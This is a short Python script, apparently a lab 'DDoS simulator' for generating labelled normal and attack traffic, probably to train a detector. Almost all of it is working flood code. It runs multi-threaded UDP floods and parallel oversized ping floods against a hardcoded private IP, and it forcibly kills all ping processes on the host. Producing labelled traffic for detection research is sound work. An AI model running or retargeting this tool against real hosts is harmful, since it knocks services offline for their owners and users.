import socket
import threading
import subprocess
import os
import random
import time
import sys

TARGET_IP = "192.168.50.50"
TARGET_PORT = 80
attack_flag = False
threads = []

def stop_all():
    global attack_flag
    print("[*] Stopping all traffic...")
    attack_flag = False
    os.system("taskkill /IM ping.exe /F >nul 2>&1")
    for t in threads:
        t.join(timeout=1)
    threads.clear()
    print("[+] All traffic stopped.\n")

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random.randbytes(1024)
    while attack_flag:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass

def launch_attack(mode):
    global attack_flag
    stop_all()
    attack_flag = True
    
    if mode == "1":
        print(f"[*] Starting NORMAL ICMP Traffic to {TARGET_IP}...")
        subprocess.Popen(["ping", TARGET_IP, "-t"], stdout=subprocess.DEVNULL)
        
    elif mode == "2":
        print(f"[*] Starting VOLUMETRIC UDP FLOOD to {TARGET_IP}...")
        for _ in range(20): 
            t = threading.Thread(target=udp_flood, daemon=True)
            t.start()
            threads.append(t)
            
    elif mode == "3":
        print(f"[*] Starting MIXED VECTOR Attack (UDP + Randomized ICMP) to {TARGET_IP}...")
        for _ in range(10): 
            subprocess.Popen(["ping", TARGET_IP, "-t", "-l", str(random.randint(500, 65000))], stdout=subprocess.DEVNULL)
        for _ in range(15):
            t = threading.Thread(target=udp_flood, daemon=True)
            t.start()
            threads.append(t)

if __name__ == "__main__":
    os.system("taskkill /IM ping.exe /F >nul 2>&1")
    while True:
        print("\n=== MULTI-VECTOR DDOS SIMULATOR ===")
        print("0. Stop All Traffic")
        print("1. Normal Traffic Baseline (Label 0)")
        print("2. UDP Flood Attack (Label 1)")
        print("3. Mixed Vector Attack (Label 1)")
        
        choice = input("Select mode: ")
        if choice == '0': stop_all()
        elif choice in ['1', '2', '3']: launch_attack(choice)